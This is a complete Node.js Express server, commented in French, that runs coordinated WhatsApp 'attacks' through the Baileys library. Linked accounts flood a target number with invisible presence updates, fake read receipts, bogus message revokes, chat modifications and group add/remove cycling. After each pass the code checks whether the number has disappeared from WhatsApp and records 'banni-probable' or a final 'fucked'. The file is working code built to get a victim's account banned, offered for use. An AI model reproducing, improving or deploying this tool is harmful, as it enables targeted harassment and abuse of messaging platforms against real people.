'use strict'
const express = require('express')
const crypto = require('crypto')
const { DisconnectReason } = require('@whiskeysockets/baileys')
const { db, openSocket } = require('./wa')

const app = express()
app.use(express.json({ limit: '32kb' }))

const delay = (ms) => new Promise((r) => setTimeout(r, ms))
const uid = () => crypto.randomBytes(6).toString('hex')

const BUDGET = Number(process.env.ATTACK_BUDGET_MS || 52000)
const MAX_SESSIONS = Math.max(1, Math.min(4, Number(process.env.MAX_SESSIONS || 3)))

const RATE = 70
const BURST = 140

const ALL_MODULES = ['presence', 'receipt', 'chatmodify', 'revoke', 'globalPresence', 'group']
const DEFAULT_MODULES = ['presence', 'receipt', 'chatmodify', 'revoke']

const toJid = (raw) => {
  const d = String(raw).replace(/\D/g, '')
  if (d.length < 8) throw new Error('numéro invalide')
  return `${d}@s.whatsapp.net`
}

const newId = () => crypto.randomBytes(10).toString('hex').toUpperCase()

/* ------------------------------------------------------------------ */
/*  Modules : aucun message visible dans la conversation              */
/* ------------------------------------------------------------------ */

const MODS = {
  async presence(s, jid, n) {
    if (n % 12 === 0) await s.presenceSubscribe(jid)
    await s.sendPresenceUpdate('composing', jid)
    await s.sendPresenceUpdate('paused', jid)
  },
  async receipt(s, jid) {
    await s.sendReceipt(jid, undefined, [newId()], 'read')
  },
  async chatmodify(s, jid) {
    const key = { remoteJid: jid, fromMe: true, id: newId() }
    await s.chatModify(
      { markRead: true, lastMessages: [{ key, messageTimestamp: Math.floor(Date.now() / 1000) }] },
      jid
    )
  },
  async revoke(s, jid) {
    await s.sendMessage(jid, { delete: { remoteJid: jid, fromMe: true, id: newId() } })
  },
  async globalPresence(s, _jid, n) {
    if (n % 8 !== 0) return
    await s.sendPresenceUpdate('available')
    await s.sendPresenceUpdate('unavailable')
  },
  async group(s, jid, _n, ctx) {
    if (!ctx.groupId) return
    const op = ctx.flip ? 'remove' : 'add'
    ctx.flip = !ctx.flip
    await s.groupParticipantsUpdate(ctx.groupId, [jid], op)
  }
}

/* ------------------------------------------------------------------ */
/*  État — tolérant : aucune route ne casse si Redis est absent       */
/* ------------------------------------------------------------------ */

async function listSessions() {
  try {
    const h = (await db().hgetall('wa:sessions')) || {}
    return Object.entries(h).map(([label, v]) => ({ label, ...(JSON.parse(v) || {}) }))
  } catch { return [] }
}

async function setSession(label, patch) {
  try {
    const r = db()
    const cur = JSON.parse((await r.hget('wa:sessions', label)) || '{}')
    await r.hset('wa:sessions', { [label]: JSON.stringify({ ...cur, ...patch, at: Date.now() }) })
  } catch {}
}

async function delSession(label) {
  try { await db().hdel('wa:sessions', label) } catch {}
}

async function getJob() {
  try { return JSON.parse((await db().get('wa:job')) || 'null') } catch { return null }
}

async function setJob(job) {
  try { await db().set('wa:job', JSON.stringify(job), { ex: 900 }) } catch {}
}

/* ------------------------------------------------------------------ */
/*  Sonde publique                                                    */
/* ------------------------------------------------------------------ */

app.get('/api/ping', async (_q, res) => {
  let redis = 'ok'
  try { await db().ping() } catch (e) { redis = e.message }

  res.json({
    ok: true,
    redis,
    hasUrl: !!process.env.UPSTASH_REDIS_REST_URL,
    hasToken: !!process.env.UPSTASH_REDIS_REST_TOKEN,
    budgetMs: BUDGET,
    maxSessions: MAX_SESSIONS,
    node: process.version
  })
})

/* ------------------------------------------------------------------ */
/*  Lecture d'état                                                    */
/* ------------------------------------------------------------------ */

app.get('/api/state', async (_q, res) => {
  res.json({
    sessions: await listSessions(),
    job: await getJob(),
    maxSessions: MAX_SESSIONS,
    budgetMs: BUDGET
  })
})

app.delete('/api/session/:label', async (q, res) => {
  await delSession(q.params.label)
  res.json({ ok: true })
})

/* ------------------------------------------------------------------ */
/*  Appairage — la fonction reste ouverte jusqu'à ouverture ou 48 s   */
/* ------------------------------------------------------------------ */

app.post('/api/pair', async (q, res) => {
  const { label, phone } = q.body || {}
  if (!label || !phone) return res.status(400).json({ error: 'label et numéro requis' })
  if (!/^[a-z0-9_-]{2,24}$/i.test(label)) return res.status(400).json({ error: 'label invalide (a-z 0-9 _ -)' })

  const digits = String(phone).replace(/\D/g, '')
  if (digits.length < 8) return res.status(400).json({ error: 'numéro invalide' })

  let sock
  try {
    await setSession(label, { phone: digits, status: 'pairing', code: null })
    const opened = await openSocket(label)
    sock = opened.sock

    let code = null
    let online = false
    let asked = false

    sock.ev.on('connection.update', async (u) => {
      if (u.qr && !opened.registered && !asked) {
        asked = true
        await delay(1200)
        try {
          const raw = await sock.requestPairingCode(digits)
          code = String(raw).match(/.{1,4}/g)?.join('-') ?? raw
          await setSession(label, { status: 'awaiting', code })
        } catch (e) {
          await setSession(label, { status: 'pair-error', code: e.message })
        }
      }
      if (u.connection === 'open') {
        online = true
        await setSession(label, { status: 'online', code: null })
      }
      if (u.connection === 'close') {
        const c = u.lastDisconnect?.error?.output?.statusCode
        if (c === DisconnectReason.loggedOut) await setSession(label, { status: 'logged-out' })
        else if (!online) await setSession(label, { status: 'closed' })
      }
    })

    const end = Date.now() + 48000
    while (!online && Date.now() < end) await delay(500)

    res.json({ ok: true, code, opened: online })
  } catch (e) {
    await setSession(label, { status: 'error', code: e.message })
    res.status(500).json({ error: e.message })
  } finally {
    try { sock?.end(undefined) } catch {}
  }
})

/* ------------------------------------------------------------------ */
/*  Attaque                                                           */
/* ------------------------------------------------------------------ */

app.post('/api/attack', async (q, res) => {
  const b = q.body || {}

  const running = await getJob()
  if (running?.status === 'running') {
    return res.status(409).json({ error: 'une attaque tourne déjà' })
  }

  let jid
  try { jid = toJid(b.target) } catch (e) { return res.status(400).json({ error: e.message }) }

  const online = (await listSessions()).filter((s) => s.status === 'online').map((s) => s.label)
  const pool = (Array.isArray(b.sessions) && b.sessions.length
    ? b.sessions.filter((l) => online.includes(l))
    : online
  ).slice(0, MAX_SESSIONS)

  if (!pool.length) return res.status(400).json({ error: 'aucune session en ligne sélectionnée' })

  const passes = Math.min(3, Math.max(1, Number(b.passes) || 1))
  const mods = (Array.isArray(b.modules) && b.modules.length ? b.modules : DEFAULT_MODULES)
    .filter((m) => ALL_MODULES.includes(m))
  if (!mods.length) return res.status(400).json({ error: 'aucun module valide' })

  const groupId = b.groupId ? String(b.groupId).trim() : null
  const perPass = Math.max(12000, Math.floor((BUDGET - 12000) / passes))

  const job = {
    id: uid(),
    target: jid,
    display: String(b.target).replace(/\D/g, ''),
    status: 'running',
    signal: false,
    final: null,
    reason: null,
    startedAt: Date.now(),
    rows: Array.from({ length: passes }, (_, i) => ({
      pass: i + 1,
      sessions: Math.min(pool.length, i + 1),
      durationSec: Math.round(perPass / 1000),
      ops: 0,
      status: 'pending',
      verdict: null
    }))
  }

  await setJob(job)
  runJob(job, pool, mods, perPass, groupId).catch(async (e) => {
    job.status = 'error'
    job.reason = e.message
    await setJob(job)
  })

  res.json({ id: job.id })
})

app.post('/api/stop', async (_q, res) => {
  const job = await getJob()
  if (job && job.status === 'running') {
    job.signal = true
    await setJob(job)
  }
  res.json({ ok: true })
})

/* ------------------------------------------------------------------ */
/*  Exécution bornée dans le budget de la fonction                    */
/* ------------------------------------------------------------------ */

async function runJob(job, pool, mods, perPass, groupId) {
  const socks = {}
  const ctx = { groupId, flip: false }

  try {
    for (const label of pool) {
      const { sock } = await openSocket(label)
      socks[label] = sock
      await delay(600)
    }

    const usable = pool.filter((l) => socks[l])
    if (!usable.length) throw new Error('aucun socket ouvert')

    const probe = socks[usable[0]]
    const chk = await probe.onWhatsApp(job.target).catch(() => null)
    if (chk && (!chk.length || !chk[0]?.exists)) {
      job.status = 'done'
      job.final = 'absent'
      job.reason = 'numéro absent du réseau'
      job.rows[0].status = 'absent'
      job.rows[0].verdict = 'absent'
      return
    }

    const share = Math.max(8, Math.floor(RATE / usable.length))
    let tokens = BURST
    let last = Date.now()
    let ops = 0

    const take = () => {
      const now = Date.now()
      tokens = Math.min(BURST, tokens + ((now - last) / 1000) * share)
      last = now
      if (tokens >= 1) { tokens -= 1; return true }
      return false
    }

    for (let p = 0; p < job.rows.length; p++) {
      if (job.signal) break

      const row = job.rows[p]
      row.status = 'running'
      await setJob(job)

      const until = Date.now() + perPass
      let i = 0
      let beat = 0

      while (Date.now() < until && !job.signal) {
        if (!take()) { await delay(4); continue }

        const mod = MODS[mods[i % mods.length]]
        const sock = socks[usable[i % usable.length]]
        i++
        ops++
        mod(sock, job.target, i, ctx).catch(() => {})

        if (++beat % 50 === 0) {
          row.ops = ops
          const fresh = await getJob()
          if (fresh?.signal) job.signal = true
          await setJob(job)
        }
        await delay(2)
      }

      row.ops = ops
      row.status = job.signal ? 'stopped' : 'done'
      await setJob(job)

      const witness = socks[usable[usable.length - 1]]
      await delay(3500)

      let exists = null
      try {
        const r = await witness.onWhatsApp(job.target)
        exists = !!(r && r.length && r[0]?.exists)
      } catch { exists = null }

      row.verdict = exists === false ? 'banni-probable'
        : exists === true ? 'toujours-actif'
        : 'inconnu'
      await setJob(job)

      if (exists === false) {
        job.status = 'done'
        job.final = 'fucked'
        return
      }
    }

    if (job.status === 'running') {
      job.status = job.signal ? 'stopped' : 'done'
      const lastVerdict = job.rows[job.rows.length - 1]?.verdict
      if (!job.signal) job.final = lastVerdict === 'degrade' ? 'degrade' : 'active'
    }
  } catch (e) {
    job.status = 'error'
    job.reason = e.message
  } finally {
    for (const s of Object.values(socks)) { try { s.end(undefined) } catch {} }
    await setJob(job)
  }
}

/* ------------------------------------------------------------------ */
/*  Filet de sécurité                                                 */
/* ------------------------------------------------------------------ */

app.use((err, _q, res, _n) => {
  res.status(500).json({ error: err.message })
})

process.on('unhandledRejection', (e) => console.error('[rejection]', e?.message || e))

module.exports = app
